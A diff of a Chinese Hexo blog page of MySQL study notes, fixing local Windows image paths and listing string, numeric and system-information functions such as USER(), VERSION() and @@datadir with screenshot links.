               </time>
             
@@ -477,36 +473,33 @@
 <p>2 将所有涉及的函数进行测试并且举例说明其用法并形成报告</p>
 <p>拓展学习：针对自己所选数据库，尝试执行系统命令，自己构造所需环境</p>
 <h2 id="MySQL-字符串函数"><a href="#MySQL-字符串函数" class="headerlink" title="MySQL 字符串函数"></a>MySQL 字符串函数</h2><p>函数                  描述</p>
-<h5 id="1-ASCII-s-返回字符串-s-的第一个字符的-ASCII-码。"><a href="#1-ASCII-s-返回字符串-s-的第一个字符的-ASCII-码。" class="headerlink" title="1 ASCII(s)             返回字符串 s 的第一个字符的 ASCII 码。"></a>1 ASCII(s)             返回字符串 s 的第一个字符的 ASCII 码。</h5><p><img src="/2019/08/22/数据库系统功能相关学习/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0.jpg" alt="1">数据库系统功能相关学习</p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0.jpg" alt="2"><img src="/2019/08/22/数据库系统功能相关学习/2.jpg" alt="2"></p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0.jpg" alt="2"></p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1.png" alt="1"></p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566442514595.png" alt="1566442514595"></p>
+<h5 id="1-ASCII-s-返回字符串-s-的第一个字符的-ASCII-码。"><a href="#1-ASCII-s-返回字符串-s-的第一个字符的-ASCII-码。" class="headerlink" title="1 ASCII(s)             返回字符串 s 的第一个字符的 ASCII 码。"></a>1 ASCII(s)             返回字符串 s 的第一个字符的 ASCII 码。</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1.png" alt="1"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566442514595.png" alt="1566442514595"></p>
 <h5 id="2-CHAR-LENGTH-s-返回字符串-s-的字符数"><a href="#2-CHAR-LENGTH-s-返回字符串-s-的字符数" class="headerlink" title="2 CHAR_LENGTH(s)     返回字符串 s 的字符数"></a>2 CHAR_LENGTH(s)     返回字符串 s 的字符数</h5><p>   CHARACTER_LENGTH(s)     返回字符串 s 的字符数     </p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566442671851.png" alt="1566442671851"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566442671851.png" alt="1566442671851"></p>
 <h5 id="3-CONCAT-s1-s2…sn-字符串-s1-s2-等多个字符串合并为一个字符串"><a href="#3-CONCAT-s1-s2…sn-字符串-s1-s2-等多个字符串合并为一个字符串" class="headerlink" title="3 CONCAT(s1,s2…sn)     字符串 s1,s2 等多个字符串合并为一个字符串"></a>3 CONCAT(s1,s2…sn)     字符串 s1,s2 等多个字符串合并为一个字符串</h5><p>合并多个字符串</p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566442904650.png" alt="1566442904650"></p>
-<h5 id="4-LOCATE-s1-s-从字符串-s-中获取-s1-的开始位置"><a href="#4-LOCATE-s1-s-从字符串-s-中获取-s1-的开始位置" class="headerlink" title="4 LOCATE(s1,s) 从字符串 s 中获取 s1 的开始位置"></a>4 LOCATE(s1,s) 从字符串 s 中获取 s1 的开始位置</h5><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566443444608.png" alt="1566443444608"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566442904650.png" alt="1566442904650"></p>
+<h5 id="4-LOCATE-s1-s-从字符串-s-中获取-s1-的开始位置"><a href="#4-LOCATE-s1-s-从字符串-s-中获取-s1-的开始位置" class="headerlink" title="4 LOCATE(s1,s) 从字符串 s 中获取 s1 的开始位置"></a>4 LOCATE(s1,s) 从字符串 s 中获取 s1 的开始位置</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1566443444608.png" alt="1566443444608"></p>
 <h5 id="5LCASE-s-将字符串-s-的所有字母变成小写字母"><a href="#5LCASE-s-将字符串-s-的所有字母变成小写字母" class="headerlink" title="5LCASE(s)     将字符串 s 的所有字母变成小写字母"></a>5LCASE(s)     将字符串 s 的所有字母变成小写字母</h5><p>LOWER(s)     将字符串 s 的所有字母变成小写字母     </p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566443704968.png" alt="1566443704968"></p>
-<h5 id="6LEFT-s-n-返回字符串-s-的前-n-个字符"><a href="#6LEFT-s-n-返回字符串-s-的前-n-个字符" class="headerlink" title="6LEFT(s,n)     返回字符串 s 的前 n 个字符"></a>6LEFT(s,n)     返回字符串 s 的前 n 个字符</h5><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566443616729.png" alt="1566443616729"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566443704968.png" alt="1566443704968"></p>
+<h5 id="6LEFT-s-n-返回字符串-s-的前-n-个字符"><a href="#6LEFT-s-n-返回字符串-s-的前-n-个字符" class="headerlink" title="6LEFT(s,n)     返回字符串 s 的前 n 个字符"></a>6LEFT(s,n)     返回字符串 s 的前 n 个字符</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1566443616729.png" alt="1566443616729"></p>
 <p>7 LPAD(s1,len,s2)     在字符串 s1 的开始处填充字符串 s2，使字符串长度达到 len     </p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566443863904.png" alt="1566443863904"></p>
-<h5 id="7-REPEAT-s-n-将字符串-s-重复-n-次"><a href="#7-REPEAT-s-n-将字符串-s-重复-n-次" class="headerlink" title="7 REPEAT(s,n)     将字符串 s 重复 n 次"></a>7 REPEAT(s,n)     将字符串 s 重复 n 次</h5><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566444038904.png" alt="1566444038904"></p>
-<h5 id="8-REVERSE-s-将字符串s的顺序反过来"><a href="#8-REVERSE-s-将字符串s的顺序反过来" class="headerlink" title="8 REVERSE(s)     将字符串s的顺序反过来"></a>8 REVERSE(s)     将字符串s的顺序反过来</h5><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566444091714.png" alt="1566444091714"></p>
-<h5 id="9-RIGHT-s-n-返回字符串-s-的后-n-个字符"><a href="#9-RIGHT-s-n-返回字符串-s-的后-n-个字符" class="headerlink" title="9 RIGHT(s,n)     返回字符串 s 的后 n 个字符"></a>9 RIGHT(s,n)     返回字符串 s 的后 n 个字符</h5><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566444156446.png" alt="1566444156446"></p>
-<h5 id="10-RPAD-s1-len-s2-在字符串-s1-的结尾处添加字符串-s2，使字符串的长度达到-len"><a href="#10-RPAD-s1-len-s2-在字符串-s1-的结尾处添加字符串-s2，使字符串的长度达到-len" class="headerlink" title="10 RPAD(s1,len,s2)     在字符串 s1 的结尾处添加字符串 s2，使字符串的长度达到 len"></a>10 RPAD(s1,len,s2)     在字符串 s1 的结尾处添加字符串 s2，使字符串的长度达到 len</h5><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566444223751.png" alt="1566444223751"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566443863904.png" alt="1566443863904"></p>
+<h5 id="7-REPEAT-s-n-将字符串-s-重复-n-次"><a href="#7-REPEAT-s-n-将字符串-s-重复-n-次" class="headerlink" title="7 REPEAT(s,n)     将字符串 s 重复 n 次"></a>7 REPEAT(s,n)     将字符串 s 重复 n 次</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1566444038904.png" alt="1566444038904"></p>
+<h5 id="8-REVERSE-s-将字符串s的顺序反过来"><a href="#8-REVERSE-s-将字符串s的顺序反过来" class="headerlink" title="8 REVERSE(s)     将字符串s的顺序反过来"></a>8 REVERSE(s)     将字符串s的顺序反过来</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1566444091714.png" alt="1566444091714"></p>
+<h5 id="9-RIGHT-s-n-返回字符串-s-的后-n-个字符"><a href="#9-RIGHT-s-n-返回字符串-s-的后-n-个字符" class="headerlink" title="9 RIGHT(s,n)     返回字符串 s 的后 n 个字符"></a>9 RIGHT(s,n)     返回字符串 s 的后 n 个字符</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1566444156446.png" alt="1566444156446"></p>
+<h5 id="10-RPAD-s1-len-s2-在字符串-s1-的结尾处添加字符串-s2，使字符串的长度达到-len"><a href="#10-RPAD-s1-len-s2-在字符串-s1-的结尾处添加字符串-s2，使字符串的长度达到-len" class="headerlink" title="10 RPAD(s1,len,s2)     在字符串 s1 的结尾处添加字符串 s2，使字符串的长度达到 len"></a>10 RPAD(s1,len,s2)     在字符串 s1 的结尾处添加字符串 s2，使字符串的长度达到 len</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1566444223751.png" alt="1566444223751"></p>
 <h5 id="11-SPACE-n-返回-n-个空格"><a href="#11-SPACE-n-返回-n-个空格" class="headerlink" title="11 SPACE(n)     返回 n 个空格"></a>11 SPACE(n)     返回 n 个空格</h5><p>返回 10 个空格：</p>
 <p>SELECT SPACE(10);</p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566444318896.png" alt="1566444318896"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566444318896.png" alt="1566444318896"></p>
 <p>12 STRCMP(s1,s2)     比较字符串 s1 和 s2，如果 s1 与 s2 相等返回 0 ，如果 s1&gt;s2 返回 1，如果 s1&lt;s2 返回 -1     </p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566444394200.png" alt="1566444394200"></p>
-<h5 id="12-SUBSTR-s-start-length-从字符串-s-的-start-位置截取长度为-length-的子字符串"><a href="#12-SUBSTR-s-start-length-从字符串-s-的-start-位置截取长度为-length-的子字符串" class="headerlink" title="12  SUBSTR(s, start, length)     从字符串 s 的 start 位置截取长度为 length 的子字符串"></a>12  SUBSTR(s, start, length)     从字符串 s 的 start 位置截取长度为 length 的子字符串</h5><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566444508607.png" alt="1566444508607"></p>
-<h5 id="13-TRIM-s-去掉字符串-s-开始和结尾处的空格"><a href="#13-TRIM-s-去掉字符串-s-开始和结尾处的空格" class="headerlink" title="13 TRIM(s)     去掉字符串 s 开始和结尾处的空格"></a>13 TRIM(s)     去掉字符串 s 开始和结尾处的空格</h5><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566444626624.png" alt="1566444626624"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566444394200.png" alt="1566444394200"></p>
+<h5 id="12-SUBSTR-s-start-length-从字符串-s-的-start-位置截取长度为-length-的子字符串"><a href="#12-SUBSTR-s-start-length-从字符串-s-的-start-位置截取长度为-length-的子字符串" class="headerlink" title="12  SUBSTR(s, start, length)     从字符串 s 的 start 位置截取长度为 length 的子字符串"></a>12  SUBSTR(s, start, length)     从字符串 s 的 start 位置截取长度为 length 的子字符串</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1566444508607.png" alt="1566444508607"></p>
+<h5 id="13-TRIM-s-去掉字符串-s-开始和结尾处的空格"><a href="#13-TRIM-s-去掉字符串-s-开始和结尾处的空格" class="headerlink" title="13 TRIM(s)     去掉字符串 s 开始和结尾处的空格"></a>13 TRIM(s)     去掉字符串 s 开始和结尾处的空格</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1566444626624.png" alt="1566444626624"></p>
 <h5 id="14-UCASE-s-将字符串转换为大写"><a href="#14-UCASE-s-将字符串转换为大写" class="headerlink" title="14  UCASE(s)     将字符串转换为大写"></a>14  UCASE(s)     将字符串转换为大写</h5><p>​       UPPER(s)     将字符串转换为大写     </p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566444690703.png" alt="1566444690703"></p>
-<h2 id="MySQL-数字函数"><a href="#MySQL-数字函数" class="headerlink" title="MySQL 数字函数"></a>MySQL 数字函数</h2><h5 id="15-ABS-x-返回-x-的绝对值"><a href="#15-ABS-x-返回-x-的绝对值" class="headerlink" title="15 ABS(x)     返回 x 的绝对值　　"></a>15 ABS(x)     返回 x 的绝对值　　</h5><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566446871033.png" alt="1566446871033"></p>
-<h5 id="16-AVG-expression-返回一个表达式的平均值，expression-是一个字段"><a href="#16-AVG-expression-返回一个表达式的平均值，expression-是一个字段" class="headerlink" title="16 AVG(expression)     返回一个表达式的平均值，expression 是一个字段"></a>16 AVG(expression)     返回一个表达式的平均值，expression 是一个字段</h5><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566447377684.png" alt="1566447377684"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566444690703.png" alt="1566444690703"></p>
+<h2 id="MySQL-数字函数"><a href="#MySQL-数字函数" class="headerlink" title="MySQL 数字函数"></a>MySQL 数字函数</h2><h5 id="15-ABS-x-返回-x-的绝对值"><a href="#15-ABS-x-返回-x-的绝对值" class="headerlink" title="15 ABS(x)     返回 x 的绝对值　　"></a>15 ABS(x)     返回 x 的绝对值　　</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1566446871033.png" alt="1566446871033"></p>
+<h5 id="16-AVG-expression-返回一个表达式的平均值，expression-是一个字段"><a href="#16-AVG-expression-返回一个表达式的平均值，expression-是一个字段" class="headerlink" title="16 AVG(expression)     返回一个表达式的平均值，expression 是一个字段"></a>16 AVG(expression)     返回一个表达式的平均值，expression 是一个字段</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1566447377684.png" alt="1566447377684"></p>
 <table>
 <thead>
 <tr>
@@ -955,28 +948,28 @@
 <td><code>SELECT YEARWEEK(&quot;2017-06-15&quot;); -&gt; 201724</code></td>
 </tr>
 </tbody></table>
-<h2 id="MySQL-高级函数"><a href="#MySQL-高级函数" class="headerlink" title="MySQL 高级函数"></a>MySQL 高级函数</h2><h5 id="17-BIN-x-返回-x-的二进制编码"><a href="#17-BIN-x-返回-x-的二进制编码" class="headerlink" title="17 BIN(x)     返回 x 的二进制编码"></a>17 BIN(x)     返回 x 的二进制编码</h5><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566517618819.png" alt="1566517618819"></p>
-<h5 id="18-BINARY-s-将字符串-s-转换为二进制字符串"><a href="#18-BINARY-s-将字符串-s-转换为二进制字符串" class="headerlink" title="18 BINARY(s)     将字符串 s 转换为二进制字符串"></a>18 BINARY(s)     将字符串 s 转换为二进制字符串</h5><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566517678446.png" alt="1566517678446"></p>
-<h5 id="19-CONNECTION-ID-返回服务器的连接数"><a href="#19-CONNECTION-ID-返回服务器的连接数" class="headerlink" title="19 CONNECTION_ID()     返回服务器的连接数"></a>19 CONNECTION_ID()     返回服务器的连接数</h5><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566517812120.png" alt="1566517812120"></p>
-<h5 id="20-CURRENT-USER-返回当前用户"><a href="#20-CURRENT-USER-返回当前用户" class="headerlink" title="20 CURRENT_USER()     返回当前用户"></a>20 CURRENT_USER()     返回当前用户</h5><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566517871734.png" alt="1566517871734">    </p>
-<h5 id="SESSION-USER-返回当前用户"><a href="#SESSION-USER-返回当前用户" class="headerlink" title="SESSION_USER()     返回当前用户"></a>SESSION_USER()     返回当前用户</h5><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566517937495.png" alt="1566517937495"></p>
+<h2 id="MySQL-高级函数"><a href="#MySQL-高级函数" class="headerlink" title="MySQL 高级函数"></a>MySQL 高级函数</h2><h5 id="17-BIN-x-返回-x-的二进制编码"><a href="#17-BIN-x-返回-x-的二进制编码" class="headerlink" title="17 BIN(x)     返回 x 的二进制编码"></a>17 BIN(x)     返回 x 的二进制编码</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1566517618819.png" alt="1566517618819"></p>
+<h5 id="18-BINARY-s-将字符串-s-转换为二进制字符串"><a href="#18-BINARY-s-将字符串-s-转换为二进制字符串" class="headerlink" title="18 BINARY(s)     将字符串 s 转换为二进制字符串"></a>18 BINARY(s)     将字符串 s 转换为二进制字符串</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1566517678446.png" alt="1566517678446"></p>
+<h5 id="19-CONNECTION-ID-返回服务器的连接数"><a href="#19-CONNECTION-ID-返回服务器的连接数" class="headerlink" title="19 CONNECTION_ID()     返回服务器的连接数"></a>19 CONNECTION_ID()     返回服务器的连接数</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1566517812120.png" alt="1566517812120"></p>
+<h5 id="20-CURRENT-USER-返回当前用户"><a href="#20-CURRENT-USER-返回当前用户" class="headerlink" title="20 CURRENT_USER()     返回当前用户"></a>20 CURRENT_USER()     返回当前用户</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1566517871734.png" alt="1566517871734">    </p>
+<h5 id="SESSION-USER-返回当前用户"><a href="#SESSION-USER-返回当前用户" class="headerlink" title="SESSION_USER()     返回当前用户"></a>SESSION_USER()     返回当前用户</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1566517937495.png" alt="1566517937495"></p>
 <p> SYSTEM_USER()     返回当前用户     </p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566517978782.png" alt="1566517978782"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566517978782.png" alt="1566517978782"></p>
 <p>USER()     返回当前用户     </p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566518003623.png" alt="1566518003623"></p>
-<h5 id="21-VERSION-返回数据库的版本号"><a href="#21-VERSION-返回数据库的版本号" class="headerlink" title="21 VERSION()     返回数据库的版本号"></a>21 VERSION()     返回数据库的版本号</h5><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566518079926.png" alt="1566518079926"></p>
-<h5 id="22-DATABASE-返回当前数据库名"><a href="#22-DATABASE-返回当前数据库名" class="headerlink" title="22  DATABASE()     返回当前数据库名"></a>22  DATABASE()     返回当前数据库名</h5><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566518219360.png" alt="1566518219360"></p>
-<h5 id="23-datadir-返回-数据库路径"><a href="#23-datadir-返回-数据库路径" class="headerlink" title="23 @@datadir 返回 数据库路径"></a>23 @@datadir 返回 数据库路径</h5><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566518704807.png" alt="1566518704807"></p>
-<h5 id="24-version-compile-os-返回操作系统版本"><a href="#24-version-compile-os-返回操作系统版本" class="headerlink" title="24  @@version_compile_os 返回操作系统版本"></a>24  @@version_compile_os 返回操作系统版本</h5><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566518753877.png" alt="1566518753877"></p>
-<h1 id="Mysql通过system命令调用系统shell命令"><a href="#Mysql通过system命令调用系统shell命令" class="headerlink" title="Mysql通过system命令调用系统shell命令"></a>Mysql通过system命令调用系统shell命令</h1><p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566822624149.png" alt="1566822624149"></p>
-<p><img src="/2019/08/22/数据库系统功能相关学习/E:%5C%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%5CBlog%5Csource_posts%5C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5C1566823276097.png" alt="1566823276097"></p>
+<p><img src="/2019/08/22/数据库系统功能相关学习/1566518003623.png" alt="1566518003623"></p>
+<h5 id="21-VERSION-返回数据库的版本号"><a href="#21-VERSION-返回数据库的版本号" class="headerlink" title="21 VERSION()     返回数据库的版本号"></a>21 VERSION()     返回数据库的版本号</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1566518079926.png" alt="1566518079926"></p>
+<h5 id="22-DATABASE-返回当前数据库名"><a href="#22-DATABASE-返回当前数据库名" class="headerlink" title="22  DATABASE()     返回当前数据库名"></a>22  DATABASE()     返回当前数据库名</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1566518219360.png" alt="1566518219360"></p>
+<h5 id="23-datadir-返回-数据库路径"><a href="#23-datadir-返回-数据库路径" class="headerlink" title="23 @@datadir 返回 数据库路径"></a>23 @@datadir 返回 数据库路径</h5><p><img src="/2019/08/22/数据库系统功能相关学习/1566518704807.png" alt="1566518704807"></p>
